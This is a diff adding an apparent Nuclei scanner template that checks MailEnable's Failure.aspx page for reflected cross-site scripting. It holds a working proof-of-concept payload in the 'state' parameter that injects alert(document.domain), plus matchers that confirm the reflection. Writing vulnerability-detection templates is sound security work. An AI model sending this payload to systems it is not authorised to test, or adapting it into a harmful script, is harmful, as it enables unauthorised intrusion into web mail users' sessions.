@@ -1,0 +1,24 @@
+id: MailEnable-XSS
+info:
+  name: MailEnable-XSS
+  author: xxx
+  severity: medium
+  tags: XSS
+
+http:
+  - raw:
+      - |
+        GET /Mondo/lang/sys/Failure.aspx?state=19753%22;}alert(document.domain);function%20test(){%22 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "alert(document.domain);"
+          - 'Authentication Failed'
+        condition: and
+      - type: status
+        status: 
+          - 200
